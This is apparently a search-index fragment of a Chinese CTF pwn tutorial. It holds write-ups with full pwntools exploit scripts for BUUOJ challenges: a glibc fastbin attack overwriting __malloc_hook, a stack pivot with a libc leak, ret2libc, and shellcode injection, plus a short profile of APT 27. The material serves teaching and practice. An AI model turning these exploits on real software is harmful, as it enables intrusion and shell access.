<p>\u6211\u4eec\u7b49\u4e0b\u8981 malloc \u56de chunk 4 \uff0c\u53ef\u662f malloc fastbin \u6709\u68c0\u67e5</p> <p>\u5f53\u4ece fastbin \u4e2d\u5206\u914d chunk \u65f6\uff0cglibc \u4f1a\u68c0\u67e5 chunk \u7684 <code>size</code> \u5b57\u6bb5\u662f\u5426\u4e0e\u5f53\u524d fastbin \u7684\u5927\u5c0f\u7c7b\u522b\u5339\u914d</p> <p>\u6240\u4ee5\u6211\u4eec\u8986\u76d6 chunk 4 \u7684 size \u4e3a fastbin \u5927\u5c0f\u6765\u901a\u8fc7\u68c0\u67e5</p> <p>\u7136\u540e\u901a\u8fc7\u4e24\u6b21(\u56e0\u4e3a fast bin \u662f\u5355\u94fe\u8868) malloc\uff0c\u5c31\u53ef\u4ee5 small chunk \u653e\u5165 fast bin \u4e2d\u4e86</p> <pre><code>payload = p64(0) * 3 + p64(0x21)\n\nfill(3, payload)\n\nalloc(0x10)\nalloc(0x10)\n</code></pre> <p>chunk4 \u88ab\u6211\u4eec\u4fee\u6539\u6210\u4e86 fastbin</p> <p></p> <p>\u8fd9\u6837\u5c31\u6709\u4e24\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a chunk \u4e86\uff0c\u7136\u540e\u6062\u590d\u5176 size \u5927\u5c0f\uff0c\u7533\u8bf7\u56de\u6765\u5728\u91ca\u653e\u6389(\u91ca\u653e\u65f6\uff0c\u662f\u5f53\u505a small bin \u91ca\u653e\u7684)</p> <p>\u63a5\u7740\u67e5\u770b\u5bf9\u5e94 chunk \u7684 index \u5c31\u597d\u4e86</p> <pre><code>payload = p64(0) * 3 + p64(0x91)\n\nfill(3, payload)\n\nalloc(0x80)\n\nfree(4)\n</code></pre> <p></p>"},{"location":"Pwn/Chapter4/4-7/#unsorted-bin-\u7684\u7279\u6027","title":"unsorted bin \u7684\u7279\u6027","text":"<ul> <li>unsorted bin \u662f glibc \u4e2d\u7528\u4e8e\u7ba1\u7406\u91ca\u653e\u7684\u5185\u5b58\u5757\u7684\u4e00\u79cd bin</li> <li>\u5b83\u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff0c\u6bcf\u4e2a\u7a7a\u95f2 chunk \u901a\u8fc7 <code>fd</code>\uff08forward pointer\uff09\u548c <code>bk</code>\uff08backward pointer\uff09\u6307\u9488\u94fe\u63a5</li> <li>\u5f53 unsorted bin \u4e2d\u53ea\u6709\u4e00\u4e2a chunk \u65f6\uff0c\u5b83\u7684 <code>fd</code> \u548c <code>bk</code> \u6307\u9488\u4f1a\u6307\u5411\u540c\u4e00\u4e2a\u5730\u5740\uff0c\u5373 unsorted bin \u94fe\u8868\u7684\u5934\u90e8\uff08main_arena + 0x58\uff09</li> </ul>"},{"location":"Pwn/Chapter4/4-7/#main_arena-\u548c-libc-\u7684\u5173\u7cfb","title":"main_arena \u548c libc \u7684\u5173\u7cfb","text":"<ul> <li>main_arena \u662f glibc \u4e2d\u7528\u4e8e\u7ba1\u7406\u5806\u5185\u5b58\u7684\u4e3b\u8981\u7ed3\u6784\u4f53\uff0c\u5b83\u5305\u542b\u4e86\u5404\u79cd bin \u7684\u4fe1\u606f</li> <li>main_arena \u662f libc \u4e2d\u7684\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5b58\u50a8\u5728 libc \u7684 data \u6bb5\u4e2d</li> <li>main_arena \u7684\u5730\u5740\u76f8\u5bf9\u4e8e libc \u57fa\u5730\u5740\u6709\u4e00\u4e2a\u56fa\u5b9a\u7684\u504f\u79fb\uff08\u5982 <code>0x3c4b20</code>\uff09</li> </ul> <p>\u8fd9\u4e2a\u5730\u5740\u4e3a main_arena + 0x58 \uff0c\u800c\u4e14 main_arena \u53c8\u76f8\u5bf9 libc \u56fa\u5b9a\u504f\u79fb 0x3c4b20</p> <p>\u6240\u4ee5\u5f97\u5230\u8fd9\u4e2a fd \u7684\u503c\uff0c\u7136\u540e\u51cf\u53bb 0x58 \u518d\u51cf\u53bb main_arena \u76f8\u5bf9\u4e8e libc \u7684\u56fa\u5b9a\u504f\u79fb\uff0c\u5373\u5f97\u5230 libc \u7684\u57fa\u5730\u5740</p> <pre><code># 0x3c4b78?\n# libc_base=\uff08\u7a0b\u5e8f\u91cc\u7684 main_arena+88\uff09-0x3c4b78(0x3c4b0+88,\u4e00\u822c 2.23_64 \u7684\u504f\u79fb\u90fd\u662f\u8fd9\u4e2a\uff0c\u4e0d\u540c libc \u7248\u672c\u4f1a\u6709\u4e0d\u540c)\n\n# index=2?\n# \u7531\u4e8e\u6211\u4eec\u521a\u521a\u628a chunk 2 \u7684 fd \u6307\u9488\u6539\u4e3a chunk 4 \u7684\u5730\u5740\uff0c\u6240\u4ee5\u7b2c\u4e00\u6b21 malloc(0x10) \u7684\u65f6\u5019\u662f\u5206\u914d\u7684\u539f\u6765 chunk 2 \u7684\u5757\u7ed9 index 1\uff0c\u7b2c\u4e8c\u6b21 malloc(0x10) \u7684\u65f6\u5019\u5c31\u4f1a\u5206\u914d chunk 4 \u7684\u5757\u7ed9 index 2\uff0c\u4e5f\u5c31\u662f\u8bf4 index 2 \u4e0e index 4 \u7684\u5185\u5bb9\u90fd\u662f chunk 4\n\n\nlibc_base = u64(dump(2)[:8].strip().ljust(8, b\"\\x00\")) - 0x3c4b78\n</code></pre>"},{"location":"Pwn/Chapter4/4-7/#malloc_hook-\u7684\u4f5c\u7528","title":"malloc_hook \u7684\u4f5c\u7528","text":"<ul> <li>malloc_hook \u662f libc \u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\u6307\u9488\uff0c\u4f4d\u4e8e libc \u7684 data \u6bb5</li> <li>\u5f53\u8c03\u7528 <code>malloc</code> \u65f6\uff0c\u5982\u679c <code>malloc_hook</code> \u4e0d\u4e3a\u7a7a\uff0c\u5219\u4f1a\u6267\u884c <code>malloc_hook</code> \u6307\u5411\u7684\u51fd\u6570</li> <li>\u901a\u8fc7\u4fee\u6539 <code>malloc_hook</code>\uff0c\u53ef\u4ee5\u52ab\u6301 <code>malloc</code> \u7684\u6267\u884c\u6d41\u7a0b\uff0c\u4ece\u800c\u5b9e\u73b0 getshell</li> </ul>"},{"location":"Pwn/Chapter4/4-7/#fastbin-attack-\u7684\u57fa\u672c\u539f\u7406","title":"fastbin attack \u7684\u57fa\u672c\u539f\u7406","text":"<ul> <li>fastbin attack \u662f\u4e00\u79cd\u5806\u6f0f\u6d1e\u5229\u7528\u6280\u672f\uff0c\u901a\u8fc7\u64cd\u63a7 fastbin \u94fe\u8868\uff0c\u5c06\u4efb\u610f\u5730\u5740\u653e\u5165 fastbin \u4e2d\uff0c\u7136\u540e\u901a\u8fc7 <code>malloc</code> \u5206\u914d\u8be5\u5730\u5740\uff0c\u4ece\u800c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199</li> <li>\u5177\u4f53\u6b65\u9aa4\uff1a</li> <li>\u901a\u8fc7\u5806\u6ea2\u51fa\u6216\u5176\u4ed6\u6f0f\u6d1e\uff0c\u4fee\u6539\u67d0\u4e2a fastbin chunk \u7684 <code>fd</code> \u6307\u9488\uff0c\u4f7f\u5176\u6307\u5411\u76ee\u6807\u5730\u5740\uff08\u5982 <code>malloc_hook</code> \u7684\u5730\u5740\uff09</li> <li>\u901a\u8fc7 <code>malloc</code> \u5206\u914d chunk\uff0c\u5c06\u76ee\u6807\u5730\u5740\u5206\u914d\u51fa\u6765</li> <li>\u5411\u5206\u914d\u7684\u5185\u5b58\u4e2d\u5199\u5165\u6570\u636e\uff0c\u4ece\u800c\u4fee\u6539\u76ee\u6807\u5730\u5740\u7684\u5185\u5bb9\uff08\u5982\u5c06 <code>malloc_hook</code> \u4fee\u6539\u4e3a <code>one_gadget</code> \u7684\u5730\u5740\uff09</li> </ul> <p>\u83b7\u5f97\u4e86 libc \u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 fastbin attack \u5c06\u4e00\u4e2a libc \u4e0a\u7684\u5730\u5740\u653e\u5165 fastbin \u94fe\u8868\u4e2d</p> <p>\u7136\u540e malloc \u51fa\u6765\uff0c\u8fd9\u6837\u5c31\u53ef\u5df2\u6539\u5199 libc \u7684\u5185\u5bb9</p> <p>malloc_hook \u662f\u4e00\u4e2a libc \u4e0a\u7684\u51fd\u6570\u6307\u9488\uff0c\u8c03\u7528 malloc \u65f6\u5982\u679c\u8be5\u6307\u9488\u4e0d\u4e3a\u7a7a\u5219\u6267\u884c\u5b83\u6307\u5411\u7684\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7\u5199 malloc_hook \u6765 getshell</p> <p>\u540c\u6837\u7684\uff0c\u8fd9\u91cc\u6211\u4eec\u4e5f\u8981\u7ed5\u8fc7 malloc \u7684\u5b89\u5168\u68c0\u67e5\uff0cchunksize \u5fc5\u987b\u4e0e fastbin_index \u76f8\u5bf9\u5e94</p> <p>\u521d\u770b __malloc_hook \u9644\u8fd1\u6ca1\u6709\u5408\u9002\u7684 chunksize\uff0c\u8fd9\u91cc\u9700\u8981\u5de7\u5999\u7684\u504f\u79fb\u4e00\u4e0b</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0\u5728 0x7f2a8a09eaed \u5904\u6784\u9020\u5757\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u6d4b\uff08\u56e0\u4e3a 7f \u6ee1\u8db3 0x70 \u5927\u5c0f\uff09</p> <p>\u53ef\u4ee5\u8ba1\u7b97 0x7f2a8a09eaed \u8ddd\u79bb libc \u57fa\u5740\u7684\u504f\u79fb\u4e3a 0x3c4aed</p> <pre><code>alloc(0x60)\n\nfree(4)\n\npayload = p64(libc_base+0x3c4aed)\n\nfill(2, payload)\n</code></pre> <p>\u63a5\u7740\u5c06 malloc_hook \u6539\u4e3a one_gadget\uff0c\u8fd9\u6837\u6211\u4eec\u5728 malloc \u7684\u65f6\u5019\u5c31\u80fd\u591f\u83b7\u53d6 shell \u4e86</p> <pre><code>alloc(0x60)\nalloc(0x60)\n\npayload = p8(0) * 3 + p64(0) * 2 + p64(libc_base + 0x4526a)\n\nfill(6, payload)\n\nalloc(255)\n</code></pre> <p>\u5b8c\u6574 payload\uff1a</p> <pre><code>from pwn import *\nimport sys\n\n\nelf = ELF(\"./babyheap_0ctf_2017\")\nlibc = ELF(\"./libc-2.23.so\")\np = remote('node5.buuoj.cn',27132)\n\ndef alloc(size):\n    p.recvuntil(\"Command: \")\n    p.sendline(\"1\")\n    p.recvuntil(\"Size: \")\n    p.sendline(str(size))\n\n\ndef fill(idx, content):\n    p.recvuntil(\"Command: \")\n    p.sendline(\"2\")\n    p.recvuntil(\"Index: \")\n    p.sendline(str(idx))\n    p.recvuntil(\"Size: \")\n    p.sendline(str(len(content)))\n    p.recvuntil(\"Content: \")\n    p.send(content)\n\n\ndef free(idx):\n    p.recvuntil(\"Command: \")\n    p.sendline(\"3\")\n    p.recvuntil(\"Index: \")\n    p.sendline(str(idx))\n\n\ndef dump(idx):\n    p.recvuntil(\"Command: \")\n    p.sendline(\"4\")\n    p.recvuntil(\"Index: \")\n    p.sendline(str(idx))\n    p.recvline()\n    return p.recvline()\n\n\nalloc(0x10)\nalloc(0x10)\nalloc(0x10)\nalloc(0x10)\nalloc(0x80)\n\nfree(1)\nfree(2)\n\npayload = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21) + p8(0x80)\n\nfill(0, payload)\n\npayload = p64(0) * 3 + p64(0x21)\n\nfill(3, payload)\n\nalloc(0x10)\nalloc(0x10)\n\npayload = p64(0) * 3 + p64(0x91)\n\nfill(3, payload)\n\nalloc(0x80)\n\nfree(4)\n\nlibc_base = u64(dump(2)[:8].strip().ljust(8, b\"\\x00\")) - 0x3c4b78\n\nalloc(0x60)\n\nfree(4)\n\npayload = p64(libc_base + 0x3c4aed)\n\nfill(2, payload)\n\nalloc(0x60)\nalloc(0x60)\n\npayload = p8(0) * 3 + p64(0) * 2 + p64(libc_base + 0x4526a)\n\nfill(6, payload)\n\nalloc(255)\n\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter4/4-8/","title":"Write \u6cc4\u9732 Libc \u7ed3\u5408 32 \u4f4d\u6808\u8fc1\u79fb","text":""},{"location":"Pwn/Chapter4/4-8/#write-\u6cc4\u9732-libc-\u7ed3\u5408-32-\u4f4d\u6808\u8fc1\u79fb","title":"Write \u6cc4\u9732 Libc \u7ed3\u5408 32 \u4f4d\u6808\u8fc1\u79fb","text":"<p>\u5148\u8f93\u51fa m1 \u7684\u5185\u5bb9</p> <p>\u7136\u540e\u8bfb\u53d6\u8f93\u5165\u5230 bss \u6bb5\u4e2d</p> <p>\u7136\u540e\u8f93\u51fa m2 \u7684\u5185\u5bb9</p> <p>\u7136\u540e\u8bfb\u53d6\u8f93\u5165\u5230\u7f13\u51b2\u533a\u4e2d</p> <p></p> <p>\u6253\u5370\u7684\u4e24\u7aef\u5185\u5bb9\u5982\u4e0b</p> <p></p> <p>\u4f46\u662f\u6ea2\u51fa\u7684\u957f\u5ea6\u592a\u5c0f\uff0c\u6ca1\u529e\u6cd5\u6784\u9020\u5f88\u957f\u7684 ROP</p> <p>\u53ef\u4ee5\u5c1d\u8bd5\u6808\u8fc1\u79fb\u5230 s \u5904</p> <p>\u5148\u6cc4\u9732 libc</p> <pre><code>payload = p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)\n\nr.recvuntil(\"What is your name?\")\nr.send(payload)\n</code></pre> <p>\u6b64\u65f6 s \u5904\u5e03\u5c40\u5982\u4e0b</p> <p></p> <p>\u627e\u4e0b <code>leave;ret</code> \u6307\u4ee4</p> <p></p> <p>\u6211\u4eec\u5728\u7ed9 buf \u53c2\u6570\u8d4b\u503c\u7684\u65f6\u5019\uff0c\u6ea2\u51fa\u540e\u5c06 rbp \u8986\u5199\u6210 <code>s-4</code> \u7684\u5730\u5740\uff0c\u51fd\u6570\u8fd4\u56de\u5730\u5740\u8986\u5199\u6210 <code>leave\uff1bret</code> \u6307\u4ee4\u7684\u5730\u5740</p> <pre><code>payload1 = b'a' * 0x18 + p32(s - 4) + p32(leave_ret)\n</code></pre> <p></p> <p>\u9996\u5148\u7a0b\u5e8f\u6b63\u5e38\u7ed3\u675f\u4e86\uff0c\u53bb\u8c03\u7528\u7a0b\u5e8f\u672c\u8eab\u7684 <code>leave\uff1bret</code> \u6765\u8fd8\u539f\u73b0\u573a</p> <p>\u6839\u636e\u6211\u4eec\u5bf9\u6808\u7684\u5e03\u5c40\uff0c<code>mov rsp\uff0crbp</code> -&gt; \u5c06 rsp \u6307\u5411\u4e86 rbp\uff0c\u6808\u53d8\u6210\u4e86\u8fd9\u4e2a\u6837\u5b50</p> <p></p> <p><code>pop rbp</code> -&gt; rbp \u5bc4\u5b58\u5668\u88ab\u6211\u4eec\u8bbe\u7f6e\u6210\u4e86\u53c2\u6570 s-4 \u7684\u5730\u5740\uff0c\u6307\u5411\u4e86\u6211\u4eec\u5e03\u7f6e\u597d\u7684\u6808\u4e0a\u65b9</p> <p>\u8fd9\u8fb9 -4 \u662f\u56e0\u4e3a\u6211\u4eec\u7b2c\u4e8c\u6b21\u6267\u884c <code>pop rbp</code> \u7ed9 rbp \u8d4b\u503c\u7684\u65f6\u5019\uff0c\u4f1a\u5c06 <code>rsp+4</code></p> <p>\u5982\u679c\u4e0d\u51cf\u53bb 4\uff0crsp \u5c31\u5728\u7a0b\u5e8f\u4e00\u5f00\u59cb\u7684\u65f6\u5019\u6307\u5411\u7684\u4e0d\u662f\u6808\u9876\uff0c\u800c\u662f\u6808\u9876 +4 \u7684\u4f4d\u7f6e</p> <p>\u6211\u4eec\u4e4b\u540e\u8bfb\u53d6\u6570\u636e\u4f1a\u4e22\u5931\u4e00\u5f00\u59cb\u7684 4 \u5b57\u8282\uff0c\u6240\u4ee5\u9700\u8981\u4e00\u5f00\u59cb\u7684\u65f6\u5019\u5c06\u6307\u9488\u5f80\u4e0a\u62ac 4 \u5b57\u8282\uff0c\u6808\u53d8\u6210\u4e86\u8fd9\u4e2a\u6837\u5b50</p> <p></p> <p>\u518d\u6b21\u6267\u884c <code>leave\uff1bret</code> \u6307\u4ee4</p> <p><code>mov rsp,rbp</code> -&gt; rsp \u6307\u5411\u4e86\u53c2\u6570 <code>s-4</code> \u7684\u4f4d\u7f6e\uff0c\u6808\u5e03\u5c40\u73b0\u5728\u662f\u8fd9\u6837</p> <p></p> <p><code>pop rbp</code> -&gt; \u5f39\u51fa\u6808\u9876\u7684\u503c\u7ed9 rbp\uff0c\u4e4b\u540e\u6808\u53d8\u6210\u4e86\u8fd9\u6837\uff0c\u6211\u4eec\u6210\u529f\u5c06 esp \u6307\u9488\u52ab\u6301\u5230\u4e86\u6211\u4eec\u5e03\u7f6e\u597d\u7684\u6808\u4e0a</p> <p></p> <p>\u63a5\u4e0b\u6765\u5b83\u5c31\u4f1a\u53bb\u6267\u884c\u6211\u4eec\u5e03\u7f6e\u597d\u7684\u6cc4\u9732 libc \u7684\u6b65\u9aa4</p> <p>\u6211\u4eec\u53bb\u63a5\u6536\u5b83\u8f93\u51fa\u7684 write \u51fd\u6570\u5730\u5740\uff0c\u5c31\u77e5\u9053\u4e86 libc \u7248\u672c</p> <p>\u63a5\u4e0b\u6765\u5c31\u80fd\u53bb\u6784\u9020 <code>system('/bin/sh')</code> \u4e86</p> <p>\u63a5\u4e0b\u6765\u5728\u91cd\u590d\u4e00\u4e0b\u4e0a\u8ff0\u7684\u63a7\u5236\u6d41\u7a0b\uff0c\u5c31\u80fd\u62ff\u5230 shell \u4e86</p> <pre><code>from pwn import *\nfrom LibcSearcher import *\n\n# p = process('./spwn')\nr = remote('node5.buuoj.cn',28433)\n\nelf = ELF('./spwn')\nwrite_plt = elf.plt['write']\nwrite_got = elf.got['write']\nmain = 0x8048513\ns = 0x0804A300\nleave_ret = 0x08048408\n\npayload = p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)\n\nr.recvuntil(\"What is your name?\")\nr.send(payload)\n\npayload1 = b'a' * 0x18 + p32(s-4) + p32(leave_ret)\n\nr.recvuntil(\"What do you want to say?\")\nr.send(payload1)\n\nwrite_addr = u32(r.recv(4))\n\nlibc = LibcSearcher('write',write_addr)\nlibc_base = write_addr - libc.dump('write')\nsystem = libc_base + libc.dump('system')\nsh = libc_base + libc.dump('str_bin_sh')\n\npayload = p32(system) + p32(0) + p32(sh)\n\nr.recvuntil(\"name?\")\nr.sendline(payload)\nr.recvuntil(\"say?\")\nr.sendline(payload1)\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter4/4-9/","title":"Debug \u6cc4\u9732\u6570\u636e\u4f20\u8f93\u8fc7\u7a0b","text":""},{"location":"Pwn/Chapter4/4-9/#debug-\u6cc4\u9732\u6570\u636e\u4f20\u8f93\u8fc7\u7a0b","title":"Debug \u6cc4\u9732\u6570\u636e\u4f20\u8f93\u8fc7\u7a0b","text":"<p>\u518d\u770b vuln \u51fd\u6570\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e</p> <p></p> <p>\u6ca1\u6709\u53ef\u5229\u7528\u7684\u540e\u95e8\u53ca\u5b57\u7b26\u4e32\uff0c\u6cc4\u9732 libc</p> <pre><code>payload = b'a' * (0x6c + 4) + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(write_got) + p32(4)\n</code></pre> <p>write \u51fd\u6570\u6cc4\u9732\u7684\u5730\u5740\u5e38\u89c4\u65b9\u6cd5\u90fd\u662f <code>u32(r.recv(4))</code> \u63a5\u6536</p> <p>\u4f46\u662f\u8fd9\u91cc\u63a5\u6536\u4e0d\u5230\uff0c\u6211\u4eec\u9700\u8981\u5f00\u542f debug \u67e5\u770b\u6570\u636e\u4f20\u8f93\u8fc7\u7a0b</p> <pre><code>context.log_level = 'debug'\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 0x070 \u8fd9\u4e00\u884c\u6700\u540e\u56db\u4e2a\u5b57\u8282\u5c31\u662f\u6cc4\u9732\u51fa\u6765\u7684 write \u51fd\u6570\u7684\u5730\u5740</p> <p></p> <pre><code># \\xf7\uff1a0xf7\n# [-4:]\uff1a\u6700\u540e4\u4e2a\u5b57\u8282\nwrite_addr = u32(r.recvuntil('\\xf7')[-4:])\n</code></pre> <pre><code>from pwn import *\nfrom LibcSearcher import *\n\nr = remote('node5.buuoj.cn',29336)\n\ncontext.log_level = 'debug'\nelf = ELF('./bof')\nwrite_plt = elf.plt['write']\nwrite_got = elf.got['write']\nvuln_addr = 0x80484D6\n\npayload = b'a' * (0x6c + 4) + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(write_got) + p32(4)\n\nr.sendline(payload)\n\nwrite_addr = u32(r.recvuntil('\\xf7')[-4:])\n\nlibc = LibcSearcher('write',write_addr)\nlibc_base = write_addr - libc.dump('write')\nsystem = libc_base + libc.dump('system')\nbinsh = libc_base + libc.dump('str_bin_sh')\n\npayload = b'a' * (0x6c + 4) + p32(system) + p32(vuln_addr) + p32(binsh)\n\nr.sendline(payload)\nr.interactive()\n</code></pre>"},{"location":"Pwn/Chapter5/","title":"Index","text":""},{"location":"Pwn/Chapter5/#apt-27","title":"APT 27","text":"<p>\u8be5\u7ec4\u7ec7\u66fe\u5bf9\u5168\u7403\u6570\u767e\u4e2a\u7ec4\u7ec7\uff0c\u5305\u62ec\u7f8e\u56fd\u56fd\u9632\u627f\u5305\u5546\u3001\u91d1\u878d\u670d\u52a1\u516c\u53f8\u3001\u6b27\u6d32\u65e0\u4eba\u673a\u5236\u9020\u5546\u4ee5\u53ca\u4e00\u5bb6\u6cd5\u56fd\u80fd\u6e90\u7ba1\u7406\u516c\u53f8\u5728\u7f8e\u56fd\u7684\u5b50\u516c\u53f8\u53d1\u52a8\u8fc7\u653b\u51fb 2018 \u5e74 6 \u6708 13 \u65e5\uff0c\u5361\u5df4\u65af\u57fa\u5b9e\u9a8c\u5ba4\u7684\u7814\u7a76\u4eba\u5458\u53d1\u8868\u6587\u7ae0\u8868\u793a\uff0c\u5176\u5728\u540c\u5e743\u6708\u4efd\u53d1\u73b0\u4e86\u4e00\u8d77\u9488\u5bf9\u67d0\u4e2d\u4e9a\u56fd\u5bb6\u6570\u636e\u4e2d\u5fc3\u7684\u6301\u7eed\u6027\u7f51\u7edc\u95f4\u8c0d\u6d3b\u52a8\uff0c\u76ee\u6807\u662f\u5728\u8be5\u56fd\u7684\u653f\u5e9c\u7f51\u7ad9\u4e0a\u5b9e\u65bd\u6c34\u5751\u653b\u51fb\uff0c\u4ee5\u83b7\u53d6\u5e7f\u6cdb\u7684\u653f\u5e9c\u8d44\u6e90\uff0c\u5176\u653b\u51fb\u884c\u52a8\u6700\u65e9\u53ef\u8ffd\u6eaf\u81f32017\u5e7411\u6708\u4e2d\u65ec\uff0c\u5e76\u8ba4\u4e3a\u8be5\u884c\u52a8\u51fa\u81ea APT 27 \u4e4b\u624b</p> <p>2019 \u5e74 4 \u6708\uff0c\u6d3e\u62d3\u7f51\u7edc Unit 42 \u53d1\u73b0 APT 27 \u5229\u5229\u7528\u4e86\u5fae\u8f6f SharePoint \u7684\u6f0f\u6d1e CVE-2019-0604 \u5728 Sharepoint \u670d\u52a1\u5668\u4e0a\u5b89\u88c5 China Chopper webshell \u6765\u653b\u51fb\u4e2d\u4e1c\u4e24\u4e2a\u653f\u5e9c\u7ec4\u7ec7</p> <p>\u636eSecNews\u4e8e2019\u5e745\u670830\u65e5\u7684\u62a5\u9053\uff0c\u5176\u4ee5\u68c0\u6d4b\u5230APT 27\u4ee5\u5927\u578b\u4f01\u4e1a\u7f51\u7edc\u4e3a\u76ee\u6807\uff0c\u5bf9 MySQL \u670d\u52a1\u5668\u8fdb\u884c\u4e8615,000\u6b21\u653b\u51fb</p> <p>2022\u5e741\u670826\u65e5\uff0c\u5fb7\u56fd\u8054\u90a6\u5baa\u6cd5\u4fdd\u536b\u5c40\u8868\u793a\u9ed1\u5ba2\u7ec4\u7ec7APT 27\u5df2\u5bf9\u5fb7\u56fd\u7684\u5236\u836f\u548c\u79d1\u6280\u516c\u53f8\u53d1\u52a8\u6301\u7eed\u653b\u51fb\uff0c\u800c\u8be5\u5c40\u6b64\u524d\u4e8e2019\u5e74\u7684\u4e00\u4efd\u62a5\u544a\u4e2d\u8868\u793aAPT 27\u53e6\u6709\u522b\u540d\u4e3a**\u718a\u732b\u4f7f\u8005**\uff0c\u6697\u793aAPT 27\u542b\u6709\u4e2d\u56fd\u80cc\u666f\uff0c\u5e76\u8868\u793a\u8be5\u7ec4\u7ec7\u5bf9\u5916\u56fd\u4f7f\u9986\u548c\u5173\u952e\u9886\u57df\u6784\u6210\u5a01\u80c1</p> <p>2022\u5e748\u67083\u65e5\uff0c\u4e00\u4e2a\u81ea\u79f0\u662fAPT 27\u7ec4\u7ec7\u7684YouTube\u9891\u9053\u4e0a\u4f20\u58f0\u660e\u89c6\u9891\uff0c\u8868\u793a\u53d7\u4f69\u6d1b\u897f\u8bbf\u53f0\u5f71\u54cd\uff0c\u5c06\u5bf9\u53f0\u6e7e\u53d1\u52a8\u7279\u522b\u7f51\u7edc\u884c\u52a8\uff0c\u653b\u51fb\u76ee\u6807\u4e3a\u53f0\u6e7e\u7684\u653f\u5e9c\u7f51\u7ad9\u4e0e\u57fa\u7840\u8bbe\u65bd</p> <p></p>"},{"location":"Pwn/Chapter5/5-1/","title":"ShellCode \u6ce8\u5165","text":""},{"location":"Pwn/Chapter5/5-1/#shellcode-\u6ce8\u5165","title":"ShellCode \u6ce8\u5165","text":"<p>\u5148 checksec</p> <p></p> <p>\u65e0\u6cd5\u53cd\u7f16\u8bd1\u4e3a\u4f2a\u4ee3\u7801\uff0c\u5206\u6790\u6c47\u7f16</p> <p></p> <p>\u56e0\u4e3a\u6ca1\u5f00 NX \uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u6ce8\u5165 shellcode \u6267\u884c\u4efb\u610f\u4ee3\u7801</p> <pre><code>from pwn import *\n\np = remote(\"node5.buuoj.cn\",25019)\n\ncontext(arch = 'amd64', os = 'linux')\nshellcode = asm(shellcraft.sh())\n\np.sendline(shellcode)\np.interactive()\n</code></pre> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter5/5-10/","title":"\u6c47\u7f16 ShellCode \u6ce8\u5165","text":""},{"location":"Pwn/Chapter5/5-10/#\u6c47\u7f16-shellcode-\u6ce8\u5165","title":"\u6c47\u7f16 ShellCode \u6ce8\u5165","text":"<p>\u660e\u663e\u5b58\u5728\u6808\u6ea2\u51fa</p> <p> <pre><code>context(log_level = 'debug', arch = 'i386', os = 'linux')\nshellcode=asm(shellcraft.sh())\n</code></pre></p> <p>\u4f46\u662f\u957f\u5ea6\u8fc7\u591a</p> <p></p> <p>\u8fd9\u6837\u5199 shellcode \u7684\u957f\u5ea6\u5f88\u77ed\uff0c\u80fd\u591f\u5199\u5165\u6808</p> <pre><code>shellcode ='''\nxor eax,eax               # eax \u7f6e 0\nxor edx,edx              # edx \u7f6e 0\npush edx                 # \u5c06 0 \u5165\u6808\uff0c\u6807\u8bb0\u4e86 \"/bin/sh\"\u7684\u7ed3\u5c3e\npush 0x68732f2f           # \u4f20\u9012 \"/sh\"\uff0c\u4e3a\u4e86 4 \u5b57\u8282\u5bf9\u9f50\uff0c\u4f7f\u7528 //sh\uff0c\u8fd9\u5728 execve() \u4e2d\u7b49\u540c\u4e8e /sh\npush 0x6e69622f           # \u4f20\u9012 \"/bin\"\u201d\nmov ebx,esp               # \u6b64\u65f6 esp \u6307\u5411\u4e86 \"/bin/sh\"\uff0c\u901a\u8fc7 esp \u5c06\u8be5\u5b57\u7b26\u4e32\u7684\u503c\u4f20\u9012\u7ed9 ebx\nmov al,0xB                # eax \u7f6e\u4e3a execve \u51fd\u6570\u7684\u4e2d\u65ad\u53f7\nint 0x80                  # \u8c03\u7528\u8f6f\u4e2d\u65ad\n'''\nshellcode = asm(shellcode)\n</code></pre> <p>\u5728 hint \u4e2d\u53d1\u73b0\u6709\u4e2a <code>jmp esp</code></p> <p></p> <p>shellcode \u73b0\u5728\u5199\u5165\u6808\u4e86\uff0c\u56e0\u4e3a esp \u5bc4\u5b58\u5668\u6307\u5411\u6808\u9876</p> <p>\u73b0\u5728\u5c06\u8fd4\u56de\u5730\u5740\u5199\u6210 jump_esp\uff0c\u91cd\u65b0\u8df3\u5230\u6808\u4e0a</p> <p>\u624b\u52a8\u5199\u5165 <code>sub esp,40;call esp</code> \u5f00\u6808\u6267\u884c\uff0c\u5373\u53ef\u83b7\u53d6 shell</p> <pre><code>payload = shellcode.ljust(0x24,'\\x00')+p32(jump_esp)\npayload += asm(\"sub esp,40;call esp\")\n</code></pre> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',25741)\n\ncontext(arch='i386',os='linux')\njump_esp = 0x8048554\n\nshellcode = '''\nxor eax,eax\nxor edx,edx\npush edx\npush 0x68732f2f\npush 0x6e69622f\nmov ebx,esp\nmov al,0xB\nint 0x80\n'''\n\nshellcode = asm(shellcode)\n\npayload = shellcode.ljust(0x24,b'\\x00') + p32(jump_esp)\n\npayload += asm(\"sub esp,40;call esp\")\n\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter5/5-11/","title":"\u5b57\u8282 ShellCode \u6ce8\u5165","text":""},{"location":"Pwn/Chapter5/5-11/#\u5b57\u8282-shellcode-\u6ce8\u5165","title":"\u5b57\u8282 ShellCode \u6ce8\u5165","text":"<p>\u4fdd\u62a4\u5168\u5f00</p> <p></p> 